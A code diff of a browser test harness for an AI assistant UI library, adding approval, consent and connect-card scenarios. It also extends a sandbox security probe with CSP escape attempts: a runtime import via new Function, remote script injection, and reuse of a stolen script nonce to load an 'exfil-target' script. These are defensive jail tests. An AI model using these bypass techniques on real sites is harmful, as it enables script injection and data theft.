@@ -1,8 +1,6 @@
 import {
-  compileWirePatch,
   compileWire,
   deriveShapeCard,
-  printWire,
   type ApprovalDecision,
   type ApprovalRequest,
   type Json,
@@ -25,6 +23,7 @@ import {
   ActivityPanel,
   ApprovalCard,
   AutomationsPanel,
+  ConnectCard,
   NoPolicyNotice,
   VendoOverlay,
   VendoPage,
@@ -73,7 +72,7 @@ const destructiveApproval: ApprovalRequest = {
     description: "Permanently delete an invoice",
     inputSchema: { type: "object" },
     risk: "destructive",
-    critical: true,
+    confirmEach: true,
   },
   inputPreview: "invoiceId=inv_42\npermanent=true",
   ctx: {
@@ -197,6 +196,25 @@ const boundedThread: Thread = {
   ],
 };
 
+/** The connect card's own lifecycle, over the wire fixture: Connect → the
+ *  broker returns an active account → the card settles into its quiet Connected
+ *  record in place. Slack, because the fixture already reports gmail as
+ *  connected (that card would open already-settled). */
+function ConnectLifecycleScenario() {
+  return (
+    <VendoProvider client={baseClient} components={components} theme={mapleTheme}>
+      <div style={{ width: 640, margin: "48px auto", display: "grid", justifyItems: "center" }}>
+        <ConnectCard
+          connector="composio"
+          toolkit="slack"
+          message="Connect Slack so the digest can post to your team channel."
+          onConnected={() => undefined}
+        />
+      </div>
+    </VendoProvider>
+  );
+}
+
 /** ENG-216 — host-supplied friendly tool metadata: labels, descriptions and a
  *  custom arg summarizer. Chips and the approval card read this over the raw
  *  slug / lifecycle string / raw JSON. */
@@ -214,6 +232,100 @@ const humanizedTools: ToolMetaMap = {
     },
   },
 };
+
+/** The ORDINARY consent register (spec §16) — every other approval fixture in
+ *  this harness is `destructive`, so every card proof we had was the amber
+ *  ceremony card, which reads alarming as a first impression. This is the plain
+ *  one: a `write` ask, the primary button, and boolean inputs (the row that used
+ *  to read `Permanent | true` at a bank customer). `apr_1` is the wire fixture's
+ *  own pending approval, so Approve genuinely decides over the wire. */
+const ordinaryConsentTools: ToolMetaMap = {
+  host_email_send: {
+    label: "Email the June statement",
+    description: "Sends your June statement to Dana at Ellis Books as a PDF attachment.",
+  },
+};
+
+const ordinaryConsentThread: Thread = {
+  id: "thr_ordinary",
+  subject: "browser-user",
+  createdAt: NOW,
+  updatedAt: NOW,
+  messages: [
+    {
+      id: "ord_u1",
+      role: "user",
+      parts: [{ type: "text", text: "Send my June statement to my accountant, Dana at Ellis Books." }],
+    },
+    {
+      id: "ord_a1",
+      role: "assistant",
+      parts: [
+        {
+          type: "text",
+          text: "I put your June statement together for Dana. It goes out as a PDF attachment — "
+            + "have a look and approve it below.",
+        },
+        {
+          type: "dynamic-tool",
+          toolName: "host_email_send",
+          toolCallId: "call_ordinary",
+          state: "approval-requested",
+          input: {
+            to: "dana@ellisbooks.com",
+            subject: "June statement",
+            include_transactions: true,
+            notify_recipient: false,
+          },
+          approval: { id: "apr_1" },
+        },
+        {
+          type: "data-vendo-approval",
+          data: { toolCallId: "call_ordinary", risk: "write", approvalId: "apr_1" },
+        },
+      ],
+    },
+  ],
+};
+
+function OrdinaryConsentScenario() {
+  return (
+    <VendoProvider
+      client={threadClient(baseClient, ordinaryConsentThread)}
+      components={components}
+      theme={mapleTheme}
+      tools={ordinaryConsentTools}
+    >
+      {/* A host-pane column, so the card is photographed at the proportions a
+          real product gives it rather than stretched across the viewport. */}
+      <div style={{ height: "100%", maxWidth: 820, margin: "0 auto", display: "flex", flexDirection: "column", overflow: "hidden" }}>
+        <VendoThread threadId="thr_ordinary" />
+      </div>
+    </VendoProvider>
+  );
+}
+
+/** The one surface where a card's WHOLE lifecycle is the card's own: the BYO
+ *  approval embed polls the wire, so pending → Approve → the settled record
+ *  ("Approved — ran" + the executed result) all happen in place, over a real
+ *  decision. `apr_1` is the wire fixture's pending ask (`host_email_send`,
+ *  `write`), so this is the ordinary register, byline and all. */
+function ApprovalLifecycleScenario() {
+  return (
+    <VendoProvider client={baseClient} components={components} theme={mapleTheme} tools={ordinaryConsentTools}>
+      {/* `.fl-cardshell` is `max-width: 88%` of its container (Lane A geometry),
+          so centre it — otherwise the embed's own canvas shows as a sliver down
+          one side and reads like a broken edge in a still. */}
+      <div style={{ width: 640, margin: "48px auto", display: "grid", justifyItems: "center" }}>
+        <VendoToolResult output={{
+          kind: "vendo/approval-ref@1",
+          approvalId: "apr_1",
+          summary: "Email the June statement",
+        }} />
+      </div>
+    </VendoProvider>
+  );
+}
 
 /** ENG-216 — a turn that exercises every humanization behavior at once: a chip
  *  with a host label + arg summary, a run of eight identical read chips that
@@ -363,13 +475,17 @@ const components: Record<string, ComponentType> = {
 const tree = browserTreeFixture;
 
 const securitySource = String.raw`
-import React, { useState } from "react";
+import React, { useEffect, useState } from "react";
 
-export default function SecurityProbe({ label, onRun }) {
+export default function SecurityProbe({ label, onRun, exfilOrigin }) {
   const [fetchStatus, setFetchStatus] = useState("not run");
   const [xhrStatus, setXhrStatus] = useState("not run");
   const [socketStatus, setSocketStatus] = useState("not run");
   const [importStatus, setImportStatus] = useState("not run");
+  const [runtimeImportStatus, setRuntimeImportStatus] = useState("not run");
+  const [remoteScriptStatus, setRemoteScriptStatus] = useState("not run");
+  const [stolenNonceStatus, setStolenNonceStatus] = useState("not run");
+  const [violations, setViolations] = useState([]);
   const [parentStatus, setParentStatus] = useState("not run");
   const [actionStatus, setActionStatus] = useState("not run");
   const [navigateStatus, setNavigateStatus] = useState("not run");
@@ -410,13 +526,54 @@ export default function SecurityProbe({ label, onRun }) {
     }
   }
 
+  // A written import() is rewritten by sucrase into the jail's own require, so
+  // it never becomes a module fetch at all. That is the LOADER refusing an
+  // unknown specifier, not CSP — the two mechanisms are asserted separately
+  // because a source rewrite cannot see code built at runtime (below).
   async function probeImport() {
     try {
       await import("https://example.com/mod.js");
       setImportStatus("UNEXPECTED SUCCESS");
     } catch {
-      setImportStatus("FAILURE (CSP)");
+      setImportStatus("FAILURE (jail require)");
     }
+  }
+
+  // The escape a source rewrite cannot reach: the import URL is composed at
+  // runtime, so sucrase never sees it and only script-src can stop it. Every
+  // probe below targets a REAL module on a real origin, so "UNEXPECTED SUCCESS"
+  // means foreign code actually ran in here — not that a request 404'd.
+  const exfilUrl = suffix => exfilOrigin + "/exfil-target.js?" + suffix + "=" + encodeURIComponent(label);
+
+  async function probeRuntimeImport() {
+    try {
+      await new Function("url", "return import(url)")(exfilUrl("import-secret"));
+      setRuntimeImportStatus("UNEXPECTED SUCCESS");
+    } catch {
+      setRuntimeImportStatus("FAILURE (CSP)");
+    }
+  }
+
+  // The escape that actually works: CSP blanks a nonce's content ATTRIBUTE but
+  // the IDL property survives, so same-document code can read the jail's own
+  // nonce off any script element and stamp it on one it injects.
+  function probeStolenNonce() {
+    const stolen = document.querySelector("script")?.nonce ?? "";
+    const tag = document.createElement("script");
+    tag.nonce = stolen;
+    tag.onload = () => setStolenNonceStatus("UNEXPECTED SUCCESS nonce=" + (stolen === "" ? "none" : "stolen"));
+    tag.onerror = () => setStolenNonceStatus("FAILURE (CSP) nonce=" + (stolen === "" ? "none" : "stolen"));
+    tag.src = exfilUrl("nonce-secret");
+    document.head.appendChild(tag);
+  }
+
+  // A classic script element: the other half of what an empty source list denies.
+  function probeRemoteScript() {
+    const tag = document.createElement("script");
+    tag.onload = () => setRemoteScriptStatus("UNEXPECTED SUCCESS");
+    tag.onerror = () => setRemoteScriptStatus("FAILURE (CSP)");
+    tag.src = exfilUrl("script-secret");
+    document.head.appendChild(tag);
   }
 
   function probeParent() {
@@ -460,6 +617,14 @@ export default function SecurityProbe({ label, onRun }) {
     setActionStatus("delivered");
   }
 
+  // The block is asserted from the browser's own report, not only from a caught
+  // rejection: a rejected import could mean the request left and then 404'd.
+  useEffect(() => {
+    const record = event => setViolations(seen => [...seen, event.effectiveDirective]);
+    document.addEventListener("securitypolicyviolation", record);
+    return () => document.removeEventListener("securitypolicyviolation", record);
+  }, []);
+
   return <section
     aria-label="Generated security probe"
     style={{ minHeight: "100vh", paddingBottom: 40 }}
@@ -480,6 +645,13 @@ export default function SecurityProbe({ label, onRun }) {
     <output id="socket-status">socket: {socketStatus}</output>
     <button type="button" onClick={probeImport}>Probe import</button>
     <output id="import-status">import: {importStatus}</output>
+    <button type="button" onClick={probeRuntimeImport}>Probe runtime import</button>
+    <output id="runtime-import-status">runtime import: {runtimeImportStatus}</output>
+    <button type="button" onClick={probeStolenNonce}>Probe stolen nonce</button>
+    <output id="stolen-nonce-status">stolen nonce: {stolenNonceStatus}</output>
+    <button type="button" onClick={probeRemoteScript}>Probe remote script</button>
+    <output id="remote-script-status">remote script: {remoteScriptStatus}</output>
+    <output id="csp-violations">violations: {violations.join(",")}</output>
     <button type="button" onClick={probeParent}>Probe parent DOM</button>
     <output id="parent-status">parent: {parentStatus}</output>
     <button type="button" onClick={dispatch}>Dispatch action</button>
@@ -572,6 +744,10 @@ const jailTree: UIPayload & { furnishings: Record<string, unknown> } = {
       props: {
         label: "Rendered generated props",
         onRun: { $action: "fn:secure-submit", payload: { invoiceId: "inv_42" } },
+        // A real, reachable origin that is nonetheless NOT in the jail's
+        // script-src (nothing is): the module-loader probes need a target whose
+        // "LOADED" is unambiguous, and the harness is the honest one to use.
+        exfilOrigin: location.origin,
       },
     },
     {
@@ -727,6 +903,54 @@ function InClientScenario() {
   );
 }
 
+/** Remix final shape (2026-08-02) — the review-kind standing scenario: the
+ *  payload the server ships for an unapproved review-kind version (venue
+ *  `pending-review`, NO component source travels), once awaiting review and
+ *  once carrying the reviewer's rejection note. Neither may jail-render. */
+function reviewStandingTree(review: Record<string, unknown>): UIPayload {
+  return {
+    formatVersion: "vendo-genui/v2",
+    root: "root",
+    nodes: [
+      { id: "root", component: "Stack", children: ["fork"] },
+      { id: "fork", component: "RemixedPanel", source: "generated" },
+    ],
+    ...({ inClient: { granted: false, versionHash: "sha256:under-review", reason: "pending-review", review } } as object),
+  } as UIPayload;
+}
+
+function ReviewStandingScenario() {
+  const onAction = async (): Promise<ToolOutcome> => ({ status: "ok", output: null });
+  return (
+    <TreeThemeBoundary>
+      <div className="inclient-grid">
+        <section aria-label="Remix sent for review">
+          <h2>Pending — sent for review</h2>
+          <TreeView
+            tree={reviewStandingTree({ status: "pending", versionHash: "sha256:under-review" })}
+            components={components}
+            onAction={onAction}
+          />
+        </section>
+        <section aria-label="Remix rejected with a note">
+          <h2>Rejected — the reviewer&apos;s note comes back</h2>
+          <TreeView
+            tree={reviewStandingTree({
+              status: "rejected",
+              versionHash: "sha256:under-review",
+              note: "Keep the original balance label.",
+              by: "host_reviewer",
+              at: NOW,
+            })}
+            components={components}
+            onAction={onAction}
+          />
+        </section>
+      </div>
+    </TreeThemeBoundary>
+  );
+}
+
 /** 06-apps §8 — the drift notice scenario: the host updated the component a
  *  pin was remixed from, so the payload carries a server-written `pinDrift`
  *  report. The surface says so loudly ABOVE the tree while the remixed fork
@@ -845,7 +1069,7 @@ function noApprovalsClient(client: VendoClient): VendoClient {
   return { ...client, approvals: { ...client.approvals, pending: async () => [] } };
 }
 
-/** Reproduces apps/demo-bank/src/app/vendo/page.tsx: VendoThread and VendoStage
+/** Reproduces examples/demo-bank/src/app/vendo/page.tsx: VendoThread and VendoStage
  *  mount as siblings under one bounded, scrollable flex column (Maple's /vendo
  *  tab) — the composition where the docs/verification/simplify-v2-wave2
  *  browser smoke found the voice widget could crowd out the in-conversation
@@ -933,9 +1157,116 @@ function ApprovalScenario() {
     : <ApprovalCard approval={destructiveApproval} onDecide={decide} />;
 }
 
+/** Ruling 11 / §16 law 3 — the descriptor hole, in a real browser: the SAME ask,
+ *  carrying the sentence demo-bank's `.vendo/tools.json` wrote for the MODEL.
+ *  The card must print its own words instead, and its queue row must agree. */
+const modelInstructionApproval: ApprovalRequest = {
+  id: "apr_descriptor",
+  call: { id: "call_descriptor", tool: "host_getSpendingInsights", args: { period: "month" } },
+  descriptor: {
+    name: "host_getSpendingInsights",
+    description: "Spending by category for the current period. Amounts are integer cents"
+      + " (e.g. 285000 = $2,850.00): divide by 100 exactly once before displaying,"
+      + " including any totals you compute. Do not re-divide.",
+    inputSchema: { type: "object", properties: { period: { type: "string" } } },
+    risk: "read",
+  },
+  inputPreview: "host_getSpendingInsights {\"period\":\"month\"}",
+  ctx: {
+    principal: { kind: "user", subject: "browser-user", display: "Browser User" },
+    venue: "chat",
+    presence: "present",
+  },
+  createdAt: NOW,
+};
+
+function DescriptorHoleScenario() {
+  return (
+    <VendoProvider client={baseClient} components={components} theme={mapleTheme}>
+      <ApprovalCard approval={modelInstructionApproval} onDecide={async () => undefined} />
+    </VendoProvider>
+  );
+}
+
+/** C5 (post-check) — the two-money-field ask, in a real browser: a fee BESIDE
+ *  the amount. The old rule took the first numeric field whose display changed,
+ *  so this card read "Sends $1.99 to Acme Utilities" and folded the true rows
+ *  behind Details. With no single declared amount there is no sentence, and
+ *  nothing folds. */
+const twoMoneyApproval: ApprovalRequest = {
+  id: "apr_two_money",
+  call: {
+    id: "call_two_money",
+    tool: "host_transferMoney",
+    args: { fee_cents: 199, amount_cents: 4750, recipient_name: "Acme Utilities", memo: "July water bill" },
+  },
+  descriptor: {
+    name: "host_transferMoney",
+    title: "Send money",
+    description: "Amounts are integer cents (e.g. 285000 = $2,850.00): divide by 100 exactly once.",
+    inputSchema: { type: "object", properties: { amount_cents: { type: "integer" }, fee_cents: { type: "integer" } } },
+    risk: "write",
+  },
+  inputPreview: 'host_transferMoney {"amount_cents":4750,"fee_cents":199}',
+  ctx: {
+    principal: { kind: "user", subject: "browser-user", display: "Browser User" },
+    venue: "chat",
+    presence: "present",
+  },
+  createdAt: NOW,
+};
+
+function TwoMoneyScenario() {
+  return (
+    <VendoProvider client={baseClient} components={components} theme={mapleTheme}>
+      <ApprovalCard approval={twoMoneyApproval} onDecide={async () => undefined} />
+    </VendoProvider>
+  );
+}
+
+/** C1 (post-check) — every surface a person reaches, under the UNCONFIGURED
+ *  guard posture. The developer banner ("Vendo is running without a policy ·
+ *  Configure .vendo/policy.json") used to auto-prepend itself inside every one
+ *  of these chrome boundaries; the host's own `NoPolicyNotice` is the only place
+ *  it may appear, and it is deliberately NOT mounted here. */
+function UnconfiguredPostureScenario() {
+  return (
+    <VendoProvider client={unconfiguredClient} components={components} theme={mapleTheme}>
+      <div style={{ display: "grid", gap: 18 }}>
+        <div style={{ height: 420, display: "flex" }}><VendoThread threadId="thr_1" /></div>
+        <WaitingQueue pollMs={0} />
+        <ActivityPanel />
+      </div>
+    </VendoProvider>
+  );
+}
+
 function TreeThemeBoundary({ children }: { children: ReactNode }) {
   const theme = useVendoTheme();
   return <div className="tree-theme-boundary" style={themeCssVariables(theme) as CSSProperties}>{children}</div>;
+}
+
+/**
+ * The CDN-package venue, driven by a payload the SPEC injects (`addInitScript`)
+ * rather than one written here.
+ *
+ * That is deliberate: the spec inflates the REAL bytes `vendo sync` captured for
+ * a host component out of `examples/demo-bank/.vendo/`, so nothing about the
+ * consumer is mocked — the harness supplies no package the capture did not ask
+ * for, which is exactly how the previous lane's harness reported four working
+ * components while the browser drew one.
+ */
+function InjectedTreeScenario() {
+  const surface = useMemo(() => {
+    const payload = (globalThis as { __VENDO_HARNESS_PAYLOAD__?: UIPayload }).__VENDO_HARNESS_PAYLOAD__;
+    return payload === undefined ? undefined : { kind: "tree" as const, payload };
+  }, []);
+  if (surface === undefined) return <p role="alert">No injected payload.</p>;
+  return (
+    <TreeThemeBoundary>
+      <AppFrame surface={surface} data={{}} onAction={async () => ({ status: "ok", output: [] })} />
+    </TreeThemeBoundary>
+  );
 }
 
 function TreeScenario({ jail = false }: { jail?: boolean }) {
@@ -1081,6 +1412,19 @@ function ConcurrentScenario() {
         <VendoPalette />
         <VendoOverlay />
       </div>
+    </VendoProvider>
+  );
+}
+
+/** Post-check H15 — the realistic host: the center page (its waiting strip AND
+ *  the rail's needs-you section) beside the floating overlay launcher, so all
+ *  three attention surfaces read pending asks at once. The poller trace runs
+ *  here (e2e/approvals-poller-proof.spec.ts). */
+function AttentionSurfacesScenario() {
+  return (
+    <VendoProvider client={baseClient} components={components} theme={mapleTheme}>
+      <VendoPage />
+      <VendoOverlay />
     </VendoProvider>
   );
 }
@@ -1308,66 +1652,6 @@ function TreeWireShapeScenario() {
           <output className="recorder" data-testid="shape-error-recorder">
             {JSON.stringify(broken.bindingErrors, null, 1)}
           </output>
-        </section>
-      </div>
-    </TreeThemeBoundary>
-  );
-}
-
-/** WAVE 4 GATE (v2 spec §§5,8): the ONE edit dialect live — the app prints
- *  with id anchors, an <Edit> wire patch applies deterministically, and the
- *  surface re-renders in place. */
-const EDIT_BASE_WIRE = `<App name="Cash overview">
-  <Stack gap={14}>
-    <Text text="Cash overview" variant="heading"/>
-    <Grid columns={2}>
-      <Stat label="Revenue" value="$42k"/>
-      <Card title="Notes">
-        Send the March reminders.
-      </Card>
-    </Grid>
-    <Button label="Remind" onClick="fn:send_reminder"/>
-  </Stack>
-</App>`;
-
-const EDIT_PATCH = `<Edit>
-  <Set id="stat-1" label="Revenue (Q1)" value="$61k" tone="accent"/>
-  <Insert into="grid-1" at={1}><Stat label="Overdue" value="3"/></Insert>
-  <Remove id="button-1"/>
-  <SetName name="Cash overview (edited)"/>
-</Edit>`;
-
-function TreeWireEditScenario() {
-  const noop = async (): Promise<ToolOutcome> => ({ status: "ok", output: null });
-  const base = useMemo(() => compileWire(EDIT_BASE_WIRE), []);
-  const [patched, setPatched] = useState<ReturnType<typeof compileWirePatch>>();
-  const shown = patched ?? base;
-  const payload = useMemo(
-    () => ({ ...shown.tree, components: shown.components }) as unknown as UIPayload,
-    [shown],
-  );
-  return (
-    <TreeThemeBoundary>
-      <div className="format-drill-grid">
-        <section aria-label="Edited surface">
-          <h2>{patched === undefined ? "Base app (compiled from the wire)" : `After the <Edit> patch — ${patched.name}`}</h2>
-          <PayloadView payload={payload} components={components} onAction={noop} />
-          <button
-            type="button"
-            data-testid="apply-edit"
-            onClick={() => setPatched(compileWirePatch(EDIT_PATCH, base))}
-          >
-            Apply the &lt;Edit&gt; patch
-          </button>
-          <output className="recorder" data-testid="edit-recorder">
-            {patched === undefined
-              ? "No patch applied"
-              : `patch: complete=${patched.complete} issues=${patched.issues.length} appliedOps=${patched.appliedOps}`}
-          </output>
-        </section>
-        <section aria-label="Model edit context">
-          <h2>The model's edit context (printWire, id anchors)</h2>
-          <pre className="recorder" data-testid="edit-context">{printWire(base, { includeIds: true })}</pre>
         </section>
       </div>
     </TreeThemeBoundary>
@@ -1855,16 +2139,23 @@ function scenario(pathname: string): { title: string; theme?: Partial<VendoTheme
     case "/thread-extreme": return { title: "Thread — extreme content", content: <ExtremeThreadScenario />, ownProvider: true };
     case "/thread-landing": return { title: "Landing (Maple host)", content: <LandingScenario />, ownProvider: true };
     case "/thread-humanized": return { title: "Thread — humanized (host metadata)", content: <HumanizedThreadScenario />, ownProvider: true };
+    case "/thread-ordinary-consent": return { title: "Thread — ordinary consent (write)", content: <OrdinaryConsentScenario />, ownProvider: true };
+    case "/approval-lifecycle": return { title: "Approval — pending to settled", content: <ApprovalLifecycleScenario />, ownProvider: true };
+    case "/connect-lifecycle": return { title: "Connect — pending to connected", content: <ConnectLifecycleScenario />, ownProvider: true };
     case "/thread-citations": return { title: "Thread — knowledge citations (K1)", content: <ThreadCitationsScenario />, ownProvider: true };
     case "/overlay": return { title: "Overlay", content: <AutoOpen selector='button[aria-controls="vendo-overlay-dialog"]'><VendoOverlay /></AutoOpen> };
     case "/overlay-manual": return { title: "Overlay — manual launcher", content: <VendoOverlay /> };
     case "/concurrent": return { title: "Concurrent surfaces", content: <ConcurrentScenario />, ownProvider: true };
-    case "/page": return { title: "Workspace — Apps tab", content: <AutoOpen selector='[role="tab"][aria-controls="vendo-panel-apps"]'><VendoPage /></AutoOpen> };
+    case "/page": return { title: "Workspace — Apps tab", content: <AutoOpen selector="#vendo-tab-apps"><VendoPage /></AutoOpen> };
+    case "/attention-surfaces": return { title: "Attention surfaces — page + overlay", content: <AttentionSurfacesScenario />, ownProvider: true };
     case "/page-chat": return { title: "Workspace — Chat (thread sidebar)", theme: mapleTheme, content: <VendoPage /> };
     case "/page-chat-dark": return { title: "Workspace — Chat (dark)", theme: darkTheme, content: <VendoPage /> };
     case "/palette": return { title: "Command palette", content: <OpenPalette /> };
     case "/palette-host": return { title: "Palette — host input collision", content: <PaletteHostInputScenario /> };
     case "/approval": return { title: "Destructive approval", content: <ApprovalScenario /> };
+    case "/approval-descriptor": return { title: "Approval — model-instruction descriptor", content: <DescriptorHoleScenario />, ownProvider: true };
+    case "/approval-two-money": return { title: "Approval — a fee beside the amount (C5)", content: <TwoMoneyScenario />, ownProvider: true };
+    case "/unconfigured-posture": return { title: "Unconfigured posture — every consumer surface (C1)", content: <UnconfiguredPostureScenario />, ownProvider: true };
     case "/activity": return { title: "Activity", content: <ActivityPanel /> };
     case "/activity-dark": return { title: "Activity — dark", theme: darkTheme, content: <ActivityPanel /> };
     case "/automations": return { title: "Automations", content: <AutomationsPanel /> };
@@ -1888,13 +2179,14 @@ function scenario(pathname: string): { title: string; theme?: Partial<VendoTheme
     };
     case "/tree": return { title: "Tree containment", content: <TreeScenario /> };
     case "/tree-jail": return { title: "Generated component jail", content: <TreeScenario jail /> };
+    case "/tree-injected": return { title: "Injected payload (captured host component)", content: <InjectedTreeScenario /> };
     case "/tree-inclient": return { title: "In-client venue (hash-pinned approval)", content: <InClientScenario /> };
+    case "/tree-review": return { title: "Review-kind standing (pending / rejected)", content: <ReviewStandingScenario /> };
     case "/tree-drift": return { title: "Pin drift (host component updated)", content: <PinDriftScenario /> };
     case "/tree-themed": return { title: "Tree — loud host theme", theme: loudTheme, content: <TreeScenario /> };
     case "/tree-stream": return { title: "Streaming completion", content: <StreamCompletionScenario /> };
     case "/tree-wire": return { title: "vendo-genui/v2 — wire compile + stored render", content: <TreeWireScenario /> };
     case "/tree-wire-shape": return { title: "vendo-genui/v2 — shape-aware binding (wave 3)", content: <TreeWireShapeScenario /> };
-    case "/tree-wire-edit": return { title: "vendo-genui/v2 — one-dialect edit (wave 4)", content: <TreeWireEditScenario /> };
     case "/unknown-format": return { title: "Unknown UI format", content: <UnknownFormatScenario />, ownProvider: true };
     case "/build-failed": return { title: "Failed app build — turn ends with the reason", content: <BuildFailedScenario />, ownProvider: true };
     case "/slot": return { title: "Inline app slot", content: <VendoSlot id="hero" appId="app_1"><section aria-label="Original host component"><h2>Original host hero</h2></section></VendoSlot> };
@@ -1905,6 +2197,11 @@ function scenario(pathname: string): { title: string; theme?: Partial<VendoTheme
     case "/appframe": return { title: "App execution planes", content: <AppFrameScenario /> };
     case "/byo-embed-app": return { title: "BYO chat — inline generated app", content: <ByoEmbedScenario appId="app_island" title="Weather dashboard" />, ownProvider: true };
     case "/byo-embed-building": return { title: "BYO chat — app mid-build", content: <ByoEmbedScenario appId="app_building_lands" title="Trip planner" />, ownProvider: true };
+    // §16 law 3 — the embed's terminal build failure. The wire fixture serves
+    // this app the WORST real reason we have (the wave E2E's own leaked
+    // sentence, seeded in vite.config.ts), so the browser proof is about what
+    // the person actually reads, not about a tidy fixture string.
+    case "/byo-embed-failed": return { title: "BYO chat — build failed", content: <ByoEmbedScenario appId="app_build_failed" title="Spending board" />, ownProvider: true };
     case "/affordances": return { title: "Affordances (Maple) — copy, attach, connect dock", content: <AffordancesScenario theme={mapleTheme} />, ownProvider: true };
     case "/affordances-dark": return { title: "Affordances — dark", content: <AffordancesScenario theme={darkTheme} />, ownProvider: true };
     case "/waiting": return { title: "Waiting on you", content: <WaitingScenario />, ownProvider: true };
@@ -1928,8 +2225,17 @@ function Harness() {
     );
   // Full-bleed host-frame scenarios (the Maple frame IS the host chrome) render
   // edge-to-edge, not as a card on the harness canvas.
-  if (globalThis.location.pathname === "/thread-landing") {
-    return <div data-scenario="thread-landing" style={{ position: "fixed", inset: 0 }}>{content}</div>;
+  // `/thread-ordinary-consent` joins them because it exists to be PHOTOGRAPHED:
+  // a capture of a consent card may carry no harness text in frame.
+  if (globalThis.location.pathname === "/thread-landing"
+    || globalThis.location.pathname === "/thread-ordinary-consent"
+    || globalThis.location.pathname === "/approval-lifecycle"
+    || globalThis.location.pathname === "/connect-lifecycle") {
+    return (
+      <div data-scenario={globalThis.location.pathname.slice(1)} style={{ position: "fixed", inset: 0 }}>
+        {content}
+      </div>
+    );
   }
   return (
     <main className={`harness-shell${globalThis.location.pathname === "/thread" || globalThis.location.pathname === "/activity-dark" ? " harness-dark" : ""}`} data-scenario={globalThis.location.pathname.slice(1)}>
